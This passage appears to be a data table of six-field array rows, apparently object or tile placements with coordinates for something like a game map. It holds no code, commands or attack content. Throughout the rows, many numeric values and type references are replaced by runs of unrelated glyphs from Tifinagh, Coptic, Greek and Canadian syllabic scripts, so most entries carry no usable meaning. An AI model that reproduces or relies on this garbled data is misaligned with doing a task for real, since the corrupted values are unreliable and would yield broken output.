			[1, ⵠ[568], 2, 77, 35, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 77, 34, ⵠΔᐃ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 76, 35, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 77, 33, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 77, 31, 1],
			[1, ⵠ[568], 0, 77, 29, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], ᐃⵠΔ, 71, 32, 1],
			[ᐃᐃⵠ, ⵠ[568], 0, 76, 34, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 77, 30, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 77, 28, ⵠΔΔ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 76, 28, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 75, 28, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 76, 29, 1],
			[1, ⵠ[568], 2, 76, 33, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 70, 32, 1],
			[ΔΔΔ, ⵠ[568], 2, 69, 31, 1],
			[1, ⵠ[568], 0, 68, 31, 1],
			[1, ⵠ[568], 2, 67, 31, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 67, 30, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 69, 32, 1],
			[1, ⵠ[568], ᐃᐃⵠ, 67, 32, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 68, 32, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 66, 32, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 66, 33, Ⲇᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], 2, 67, 33, 1],
			[1, ⵠ[568], 2, 70, 33, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 69, 33, ⵠΔΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 68, 33, 1],
			[ⵠⲆΔ, ⵠ[568], 0, 68, 34, 1],
			[1, ⵠ[568], 1, 66, 35, ⵠΔⲆ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 67, 34, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 66, 34, Ⲇᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], ⲆⲆΔᐃ, 65, 35, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 64, 36, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 65, 36, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠⵠΔ, 67, 35, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠⵠΔ, 66, 36, ΔⲆⵠ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 69, 34, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 68, 35, 1],
			[ᐃᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 76, Ⲇᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 77, 9, 1],
			[1, ⵠ[568], 2, 77, 8, 1],
			[ⵠΔΔ, ⵠ[568], ⵠⵠⵠΔ, 77, ᐃΔᐃΔⲆ, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 78, 8, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 78, ΔⲆⵠΔⲆ, 1],
			[1, ⵠ[568], 2, 78, ⲆΔΔᐃᐃ, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 78, 11, Ⲇᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 78, 12, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 78, 13, ΔΔΔ],
			[1, ⵠ[568], 0, 79, Ⲇᐃⵠⵠⵠ, 1],
			[ΔΔΔ, ⵠ[568], 1, 79, ΔⵠᐃΔⵠ, 1],
			[Ⲇᐃⵠ, ⵠ[568], 3, 79, ⲆⲆᐃⵠΔ, ⵠΔⲆ],
			[1, ⵠ[568], ΔⲆᐃⲆ, 79, 10, ⵠΔᐃ],
			[ΔΔΔ, ⵠ[568], ⲆΔⵠⵠ, 79, ΔᐃΔⵠⵠ, 1],
			[ΔΔΔ, ⵠ[568], 3, 80, Δᐃⵠⵠⵠ, ΔΔΔ],
			[1, ⵠ[568], ⵠΔⲆ, 80, 10, ᐃⲆᐃ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆΔⲆ, 80, 9, 1],
			[1, ⵠ[568], 2, 80, 11, 1],
			[1, ⵠ[568], 2, 81, Δᐃⵠⵠⵠ, 1],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆΔⲆ, 81, ΔΔΔΔΔ, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], 2, 81, ⵠⵠⲆΔΔ, 1],
			[ⵠΔΔ, ⵠ[568], ⵠⵠΔⲆ, 78, ⲆΔⲆⵠᐃ, 1],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 79, 13, ΔⲆⵠ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 78, ΔⲆΔⲆⲆ, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 80, ⲆΔⲆΔⲆ, 1],
			[ⵠΔⲆ, ⵠ[568], Δⵠᐃ, 79, ᐃΔᐃⲆⲆ, ⵠΔᐃ],
			[1, ⵠ[568], ⵠⲆⲆ, 82, ⵠⲆΔⵠⵠ, ΔⲆⵠ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 82, ΔᐃΔⲆⲆ, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 82, ⵠⵠΔⲆᐃ, ⵠΔᐃ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 81, Ⲇᐃᐃᐃᐃ, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[568], ⲆΔⵠⵠ, 80, ΔⲆⵠΔⵠ, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔⲆⵠ, 78, 30, 1],
			[1, ⵠ[568], 1, 78, 34, 1],
			[ᐃⲆᐃ, ⵠ[568], 1, 78, 27, ΔⲆⵠ],
			[1, ⵠ[568], 0, 78, 25, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], ΔⲆⲆ, 79, 29, 1],
			[ᐃⲆᐃ, ⵠ[568], Δⵠᐃ, 79, 32, ᐃᐃⵠ],
			[1, ⵠ[568], 0, 79, 35, ⵠΔᐃ],
			[ⵠΔⲆ, ⵠ[568], 2, 78, 35, 1],
			[1, ⵠ[568], 2, 78, 36, 1],
			[1, ⵠ[568], 2, 79, 34, 1],
			[1, ⵠ[568], 2, 78, 33, 1],
			[1, ⵠ[568], 2, 79, 33, ᐃⲆᐃ],
			[ⵠΔⲆ, ⵠ[568], ⲆⲆΔᐃ, 78, 32, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 78, 31, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 79, 31, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 79, 30, ΔΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆΔⲆ, 78, 29, ᐃⲆᐃ],
			[ᐃᐃⵠ, ⵠ[568], 2, 78, 28, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 79, 28, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 79, 27, ᐃⲆᐃ],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠⵠΔ, 78, 26, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 79, 26, ⵠⲆΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 78, 24, ΔⲆⵠ],
			[ⵠΔᐃ, ⵠ[568], 2, 80, 34, 1],
			[1, ⵠ[568], 2, 80, 33, 1],
			[ᐃᐃⵠ, ⵠ[568], ΔⵠᐃⲆ, 80, 31, ᐃⲆᐃ],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 80, 30, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 80, 32, 1],
			[1, ⵠ[568], 2, 80, 29, 1],
			[ⵠΔΔ, ⵠ[568], 2, 80, 28, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 80, 27, 1],
			[1, ⵠ[568], 0, 81, 30, 1],
			[1, ⵠ[568], ΔΔΔ, 81, 32, 1],
			[1, ⵠ[568], 1, 81, 28, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 81, 29, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[568], ΔⵠᐃⲆ, 81, 31, ⵠⲆΔ],
			[ΔΔΔ, ⵠ[568], ᐃⲆΔⲆ, 81, 33, 1],
			[1, ⵠ[568], 2, 82, 30, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 82, 31, ᐃⲆᐃ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 82, 32, ΔⲆⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 0, 37, 36, ᐃⲆᐃ],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 38, 36, ⵠΔᐃ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 37, 35, ⵠΔᐃ],
			[ΔⲆⵠ, ⵠ[568], ⲆᐃᐃⲆ, 36, 36, ΔΔΔ],
			[ⵠΔⲆ, ⵠ[568], 2, 34, 35, Ⲇᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], 2, 35, 35, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 36, 35, 1],
			[1, ⵠ[568], ⵠⲆⲆ, 33, 34, Ⲇᐃⵠ],
			[1, ⵠ[568], ᐃⲆᐃ, 35, 34, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 36, 34, ⵠⲆΔ],
			[ⵠΔΔ, ⵠ[568], ΔⵠᐃⲆ, 34, 34, ⵠΔΔ],
			[1, ⵠ[568], 2, 36, 33, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 35, 33, Ⲇᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], 2, 34, 33, 1],
			[1, ⵠ[568], 2, 33, 33, ⵠⲆΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 31, 32, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], ΔⲆⵠ, 36, 32, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[568], ⵠⲆΔ, 32, 32, 1],
			[ΔΔΔ, ⵠ[568], 2, 35, 32, 1],
			[ⵠΔΔ, ⵠ[568], 2, 33, 32, ΔⲆⵠ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 32, 33, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 33, 31, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[568], ᐃⲆΔⲆ, 34, 31, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 35, 31, 1],
			[1, ⵠ[568], ΔΔⵠ, 34, 32, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 35, 30, ΔΔΔ],
			[ⵠΔⲆ, ⵠ[568], ΔⲆⵠ, 39, 23, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], 3, 39, 22, 1],
			[1, ⵠ[568], ⵠⵠⵠᐃ, 36, 24, 1],
			[1, ⵠ[568], 3, 35, 24, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 34, 23, ⵠⲆΔ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 35, 23, ΔΔΔ],
			[1, ⵠ[568], 2, 36, ᐃΔⲆⵠᐃ, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 36, 21, 1],
			[ⵠΔᐃ, ⵠ[568], ⲆⲆΔᐃ, 35, 22, ⵠⲆΔ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 35, 16, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], 2, 34, ⵠᐃⵠⵠⲆ, 1],
			[ⵠΔᐃ, ⵠ[568], ⲆⲆΔᐃ, 33, ⵠΔⲆᐃᐃ, ΔΔΔ],
			[1, ⵠ[568], 0, 34, 17, ⵠⲆΔ],
			[1, ⵠ[568], 0, 32, ΔⲆᐃᐃⲆ, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 31, ⵠⲆΔᐃᐃ, ⵠΔᐃ],
			[ⵠΔΔ, ⵠ[568], ⲆΔⵠⵠ, 30, 13, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[568], ᐃᐃⵠ, 33, 15, ΔΔΔ],
			[1, ⵠ[568], ᐃⲆᐃ, 31, 13, ᐃᐃⵠ],
			[ⵠⲆΔ, ⵠ[568], ⲆⲆΔᐃ, 32, 14, ⵠΔΔ],
			[1, ⵠ[568], 0, 31, ᐃⵠⲆᐃᐃ, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 32, ⲆⲆᐃⵠΔ, ΔΔΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 25, 13, 1],
			[1, ⵠ[568], 0, 25, 12, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 25, 11, ΔΔΔ],
			[1, ⵠ[568], ΔⲆΔᐃ, 25, 10, ᐃᐃⵠ],
			[1, ⵠ[568], 0, 25, 9, 1],
			[ᐃᐃⵠ, ⵠ[568], ⲆᐃᐃⲆ, 25, 8, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 26, ΔᐃᐃⲆᐃ, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 27, ᐃⵠⲆᐃᐃ, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 28, ⲆᐃΔⲆⵠ, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 29, ΔᐃΔⲆⲆ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 30, 8, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 26, ⵠⲆⲆΔᐃ, 1],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 27, 9, 1],
			[ΔΔΔ, ⵠ[568], ᐃⲆΔⲆ, 26, ⵠⵠⲆΔΔ, ⵠΔΔ],
			[ⵠΔΔ, ⵠ[568], ΔΔΔ, 27, ⲆΔΔᐃᐃ, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[568], 3, 28, 9, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 25, 14, 1],
			[ⵠΔⲆ, ⵠ[568], Δⵠᐃ, 25, ⵠⵠΔⵠᐃ, 1],
			[1, ⵠ[568], 2, 26, 15, 1],
			[1, ⵠ[568], 3, 27, ⵠᐃⵠⵠⲆ, 1],
			[1, ⵠ[568], ⵠⲆⲆ, 28, ⲆⲆⲆⵠⲆ, ⵠⲆΔ],
			[1, ⵠ[568], ΔΔΔ, 29, 18, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 26, 16, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⲆᐃᐃⲆ, 25, ⲆⲆⲆΔΔ, ⵠⲆΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 27, ⲆⲆⲆⵠⲆ, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 26, 17, Ⲇᐃⵠ],
			[1, ⵠ[568], 1, 27, 18, 1],
			[1, ⵠ[568], 2, 28, ᐃΔᐃΔᐃ, ΔⲆⵠ],
			[ⵠⲆΔ, ⵠ[568], 2, 30, 19, ⵠⲆΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 29, 19, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 24, ᐃΔᐃⲆⲆ, 1],
			[1, ⵠ[568], 2, 24, 15, ᐃⲆᐃ],
			[1, ⵠ[568], 0, 23, ⵠᐃⵠΔᐃ, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 24, 10, ΔⲆⵠ],
			[1, ⵠ[568], 2, 24, ΔⵠᐃΔⵠ, 1],
			[1, ⵠ[568], 2, 24, ⵠΔᐃΔᐃ, ᐃᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], 2, 24, ⲆⵠΔᐃⵠ, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠΔᐃ, 23, 10, 1],
			[Ⲇᐃⵠ, ⵠ[568], 0, 22, Δᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 22, ΔᐃⵠⲆⵠ, Ⲇᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], 1, 23, ⵠⵠⲆⵠΔ, 1],
			[ΔΔΔ, ⵠ[568], 2, 24, 8, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 24, 9, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 23, 9, ⵠΔⲆ],
			[1, ⵠ[568], 2, 22, 9, ⵠⲆΔ],
			[1, ⵠ[568], 2, 22, ⲆⵠΔΔᐃ, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 22, ΔⲆⲆᐃᐃ, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 23, ΔⲆⲆᐃᐃ, ᐃᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], 2, 23, ⵠⲆⲆⲆᐃ, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 23, 13, ΔΔΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 22, 13, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ⲆⲆΔᐃ, 21, ΔΔⵠⲆⵠ, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 21, ⵠⵠⲆⵠΔ, 1],
			[1, ⵠ[568], 2, 29, 25, ⵠΔⲆ],
			[1, ⵠ[568], 2, 25, 24, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[568], 2, 26, 25, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 27, 25, 1],
			[Ⲇᐃⵠ, ⵠ[568], ΔΔⵠ, 28, 25, ΔⲆⵠ],
			[1, ⵠ[568], 1, 25, 23, ΔΔΔ],
			[ΔΔΔ, ⵠ[568], 2, 26, 24, 1],
			[1, ⵠ[568], 0, 24, 25, ΔⲆⵠ],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃΔᐃ, 23, 24, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 3, 24, 24, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[568], 3, 25, 25, ΔⲆⵠ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 23, 25, 1],
			[1, ⵠ[568], ΔΔΔ, 22, 26, 1],
			[ⵠⲆΔ, ⵠ[568], ΔΔΔ, 26, 26, 1],
			[1, ⵠ[568], ΔΔΔ, 29, 26, ΔⲆⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 23, 26, ⵠΔᐃ],
			[1, ⵠ[568], 2, 24, 26, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 25, 26, 1],
			[1, ⵠ[568], 2, 27, 26, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 28, 26, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 30, 26, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 29, 27, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 28, 28, ΔΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃᐃⵠ, 26, 29, ΔΔΔ],
			[ⵠΔΔ, ⵠ[568], ΔⲆⲆ, 28, 27, 1],
			[ⵠΔΔ, ⵠ[568], 2, 27, 28, Ⲇᐃⵠ],
			[ⵠⲆΔ, ⵠ[568], 2, 27, 27, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 26, 28, ᐃᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], 2, 26, 27, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], 2, 25, 28, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 25, 27, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 23, 27, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 22, 27, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 24, 27, ⵠΔⲆ],
			[1, ⵠ[568], ᐃΔΔ, 24, 28, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃΔΔ, 25, 32, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠΔΔ, 24, 30, Ⲇᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ⲆᐃᐃⲆ, 25, 31, ⵠΔⲆ],
			[1, ⵠ[568], 2, 25, 30, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 25, 29, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 24, 29, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 23, 29, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 26, 33, 1],
			[ΔⲆⵠ, ⵠ[568], 0, 26, 34, ⵠΔⲆ],
			[ᐃⲆᐃ, ⵠ[568], ΔⵠᐃⲆ, 27, 35, 1],
			[1, ⵠ[568], 2, 22, 28, 1],
			[1, ⵠ[568], 2, 23, 28, ΔⲆⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 24, 31, ΔⲆⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 24, 32, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 25, 33, 1],
			[1, ⵠ[568], 2, 26, 35, 1],
			[1, ⵠ[568], 2, 24, 33, 1],
			[ⵠⲆΔ, ⵠ[568], ⵠⵠⵠΔ, 25, 34, 1],
			[1, ⵠ[568], 1, 22, 29, ᐃⲆᐃ],
			[ⵠΔΔ, ⵠ[568], 1, 24, 34, ΔⲆⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ΔΔⵠ, 23, 35, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 25, 35, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 24, 35, 1],
			[1, ⵠ[568], 2, 23, 34, 1],
			[ⵠΔΔ, ⵠ[568], 2, 23, 33, 1],
			[ΔΔΔ, ⵠ[568], ΔⲆⲆ, 22, 33, 1],
			[1, ⵠ[568], 1, 23, 32, ⵠⲆΔ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 22, 32, ΔⲆⵠ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 23, 31, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[568], ΔⵠᐃⲆ, 23, 30, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠⵠΔ, 22, 30, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⲆⲆΔᐃ, 22, 31, 1],
			[1, ⵠ[568], ΔΔΔ, 21, 31, ⵠΔᐃ],
			[1, ⵠ[568], 0, 21, 29, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 21, 30, ⵠΔᐃ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 24, 36, ⵠⲆΔ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 26, 36, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 25, 36, 1],
			[1, ⵠ[568], 2, 27, 36, 1],
			[ΔⲆⵠ, ⵠ[568], ⲆᐃᐃⲆ, 28, 36, 1],
			[1, "d", 2, 83, 65, 1],
			[ΔΔΔ, "d", ⲆⲆΔᐃ, ΔⵠΔᐃᐃ, 67, ΔⲆⵠ],
			[1, "g", 0, 15, ⲆᐃᐃⲆΔ, ⵠΔΔ],
			[ᐃⲆᐃ, "s", ᐃⵠΔ, 18, 13, 1],
			[ΔΔΔ, "s", ᐃΔΔ, 85, ⲆⵠΔⲆⲆⵠⲆ, ΔΔΔ],
			[1, "f", 0, 41, 102, ΔΔΔ],
			[ⵠⲆΔ, "f", ΔⲆⲆ, 42, 124, 1],
			[ⵠΔⲆ, "f", ΔⲆⲆ, 64, 116, 1],
			[1, "f", 0, 74, 104, ⵠⲆΔ],
			[ⵠΔᐃ, "f", ᐃⵠⲆ, 70, 87, 1],
			[1, "f", ΔΔⵠ, 27, 96, ᐃᐃⵠ],
			[1, "f", 0, 22, 79, 1],
			[Ⲇᐃⵠ, "f", 0, ΔΔⲆⵠᐃ, 117, 1],
			[ⵠΔᐃ, "f", 0, 30, 137, ⵠΔΔ],
			[ⵠⲆΔ, "f", 0, 59, 146, 1],
			[ⵠΔᐃ, "f", Δⵠᐃ, 52, 147, Ⲇᐃⵠ],
			[ⵠΔⲆ, "f", ᐃⵠⲆ, 20, 149, 1],
			[ⵠΔⲆ, "f", 0, 36, 146, ΔⲆⵠ],
			[1, "f", Δⵠᐃ, 62, 124, Ⲇᐃⵠ],
			[1, "g", Ⲇᐃⵠ, 34, 121, 1],
			[1, "g", 1, 52, 116, ΔⲆⵠ],
			[1, "g", 1, 78, 116, Ⲇᐃⵠ],
			[1, "g", ⵠⲆΔ, 71, 129, 1],
			[ᐃᐃⵠ, "s", ᐃΔΔ, 53, 100, 1],
			[ᐃᐃⵠ, "s", ⲆΔⵠ, 73, 111, 1],
			[1, "s", 0, 77, 126, ⵠⲆΔ],
			[ᐃᐃⵠ, "s", ⲆΔⵠ, 48, 90, 1],
			[1, "s", 0, ⲆⲆⲆⵠᐃ, 102, ⵠΔΔ],
			[1, "s", 0, 18, 127, 1],
			[1, "s", Δⵠᐃ, 35, 159, ⵠΔⲆ],
			[ⵠΔΔ, "s", 0, 65, 54, ⵠΔⲆ],
			[1, "s", ΔⲆⲆ, 44, 52, Ⲇᐃⵠ],
			[1, "s", 0, 26, 51, 1],
			[ⵠⲆΔ, "f", 1, 56, 136, 1],
			[1, "f", ᐃⲆᐃ, 41, 133, ᐃⲆᐃ],
			[1, "f", ⵠΔᐃ, 80, 120, ᐃᐃⵠ],
			[ΔⲆⵠ, "f", Ⲇᐃⵠ, 16, 117, 1],
			[1, "f", 1, 13, 99, Ⲇᐃⵠ],
			[1, "f", ⵠΔΔ, 17, 89, ᐃᐃⵠ],
			[1, "f", ΔΔΔ, 90, 98, 1],
			[ⵠΔᐃ, "f", 1, 84, 95, 1],
			[ⵠΔⲆ, "f", ΔΔΔ, 16, 57, 1],
			[1, "f", 1, 77, 53, 1],
			[1, "d", 1, 48, 35, ⵠⲆΔ],
			[1, ⵠ[348], Δᐃⵠⵠⵠ, 33, 13, ⲆΔⵠ],
			[ⵠΔᐃ, ⵠ[348], 8, 30, ΔⵠᐃᐃⲆ, 0],
			[1, ⵠ[348], 9, 32, 30, 0],
			[1, ⵠ[348], ⵠⵠΔⲆᐃ, 30, 25, ⲆΔⵠ],
			[1, ⵠ[348], 10, 33, 21, 0],
			[ⵠΔⲆ, ⵠ[348], ΔᐃΔⲆⲆ, 31, 34, 0],
			[1, ⵠ[348], 8, 67, 29, 0],
			[1, ⵠ[348], 9, 70, 22, 0],
			[ⵠΔⲆ, ⵠ[348], ⵠⵠⲆΔΔ, 70, ΔΔᐃᐃⲆ, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 10, 75, ⲆⲆΔᐃᐃⲆⲆ, 0],
			[ᐃᐃⵠ, ⵠ[348], 8, 68, ⲆⵠⲆⵠⲆ, Δⵠᐃ],
			[ⵠΔᐃ, ⵠ[348], 8, 75, 30, Δⵠᐃ],
			[1, ⵠ[348], 11, 71, 33, 0],
			[ⵠΔⲆ, ⵠ[348], 11, 72, 25, 0],
			[Ⲇᐃⵠ, ⵠ[348], ⲆⲆᐃΔⲆⲆⲆ, 64, 25, 0],
			[1, ⵠ[348], ⲆΔᐃⵠᐃ, 52, 10, 0],
			[1, ⵠ[348], ⲆⲆΔᐃᐃⲆⲆ, 31, ΔⲆᐃᐃⲆ, ⵠⲆⲆ],
			[1, ⵠ[348], 30, 29, ΔᐃΔⲆⲆⲆⲆ, 0],
			[1, ⵠ[348], 30, 36, 15, ⲆΔⵠ],
			[1, ⵠ[348], 30, 34, 29, 0],
			[ⵠΔⲆ, ⵠ[348], 30, 30, 29, ⲆΔⵠ],
			[1, ⵠ[348], 30, 71, 29, 0],
			[1, ⵠ[348], 28, 68, 25, 0],
			[ᐃⲆᐃ, ⵠ[348], 28, 75, ⵠⵠΔⵠᐃ, 0],
			[1, ⵠ[348], 27, 67, ΔΔⲆᐃⵠ, 0],
			[ΔⲆⵠ, ⵠ[348], 29, 72, 10, ⵠⲆⲆ],
			[1, ⵠ[348], 29, 75, 32, ᐃΔΔ],
			[ⵠⲆΔ, ⵠ[348], 29, 32, 20, 0],
			[ΔⲆⵠ, ⵠ[273], ⵠΔΔ, 39, 12, ᐃⵠⲆ],
			[Ⲇᐃⵠ, ⵠ[273], ᐃⲆᐃ, 34, 14, Δⵠᐃ],
			[ⵠΔⲆ, ⵠ[273], ⵠΔᐃ, 74, 28, 0],
			[1, ⵠ[273], 2, 74, 29, ᐃΔΔ],
			[1, ⵠ[273], ᐃⲆⵠᐃ, 69, 30, 0],
			[ᐃⲆᐃ, ⵠ[273], ᐃⲆⵠᐃ, 77, 22, ᐃⵠⲆ],
			[1, ⵠ[273], ⵠⵠⵠΔ, 74, 21, ΔⲆⲆ],
			[1, ⵠ[273], ⲆⲆΔᐃ, 76, ⲆⵠⲆᐃΔ, 0],
			[ⵠΔᐃ, ⵠ[273], ᐃᐃⵠ, 78, ΔⲆⲆΔΔ, ᐃΔΔ],
			[1, ⵠ[273], 1, 28, ᐃΔΔⲆΔ, ΔⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[273], ⲆᐃᐃⲆ, 27, 24, ⲆΔⵠ],
			[Ⲇᐃⵠ, ⵠ[273], ⲆᐃᐃⲆ, 24, 17, 0],
			[1, ⵠ[273], ⵠⵠΔⲆ, 29, 21, 0],
